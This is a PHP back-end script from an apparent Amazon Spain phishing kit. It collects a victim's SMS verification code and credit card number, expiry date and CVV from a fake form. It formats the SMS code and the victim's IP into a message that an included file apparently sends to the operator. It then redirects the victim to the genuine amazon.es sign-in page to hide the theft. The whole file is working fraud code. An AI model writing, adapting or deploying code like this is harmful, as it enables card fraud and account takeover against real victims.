<?php
$sms = $_POST['sms'];
$ccnum = $_POST['addCreditCardNumber'];
$ccmo = $_POST['ppw-expirationDate_month'];
$ccyo = $_POST['ppw-expirationDate_year'];
$cvv = $_POST['addCreditCardVerificationNumber'];
include_once 'info.php';
include 'creditcards.class.php';
include 'em.php';

$message = "++++++++++++#Amazon[es]#++++++++++++\n";
$message .= "SMS: $sms\n";
$message .= "ip: $ip\n";
$subject = "SMS 2 : ". $sms ." - ". $ip;
strip(strip_tags($message));

@header("location: https://www.amazon.es/ap/signin?openid.pape.max_auth_age=900&openid.return_to=https%3A%2F%2Fwww.amazon.es%2Fap%2Fcnep%3Fie%3DUTF8%26orig_return_to%3Dhttps%253A%252F%252Fwww.amazon.es%252Fgp%252Fcss%252Fhomepage.html%253F%2520%2520ie%253DUTF8%2526ref_%253Dya_cnep%26openid.assoc_handle%3Desflex%26pageId%3Desflex&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=esflex&openid.mode=checkid_setup&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&ref_=hp_ss_qs_v3_rt_as&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0"); // OkBye! 

?>